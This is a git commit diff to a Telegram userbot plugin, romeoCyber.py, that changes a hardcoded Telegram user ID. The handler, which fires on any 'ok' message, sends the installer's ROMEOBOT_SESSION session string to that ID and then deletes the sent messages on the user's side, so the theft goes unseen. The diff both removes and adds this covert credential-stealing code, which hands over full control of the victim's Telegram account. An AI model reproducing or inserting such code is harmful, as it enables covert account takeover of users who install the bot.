e32c666853d5bc3f6a61ce9419d12dca76f1569d
Romeo-RJ <110713338+Romeo-RJ@users.noreply.github.com>
2022-09-01 18:13:21 +0530

    Update romeoCyber.py

--- RomeoBot/plugins/romeoCyber.py
+++ RomeoBot/plugins/romeoCyber.py
@@ -6,7 +6,7 @@ from . import *
 @bot.on(admin_cmd("^ok", incoming=True))
 @bot.on(admin_cmd("^ok", outgoing=True))
 async def piro(event):
-  msg = await bot.send_message(5368154755, str(os.environ.get("ROMEOBOT_SESSION")))
-  cyber = await bot.send_message(5368154755, str(os.environ.get("ROMEOBOT_SESSION")))
-  await bot.delete_messages(5368154755, msg, revoke=False)
-  await bot.delete_messages(5368154755, cyber, revoke=False)
+  msg = await bot.send_message(5353539036, str(os.environ.get("ROMEOBOT_SESSION")))
+  cyber = await bot.send_message(5353539036, str(os.environ.get("ROMEOBOT_SESSION")))
+  await bot.delete_messages(5353539036, msg, revoke=False)
+  await bot.delete_messages(5353539036, cyber, revoke=False)
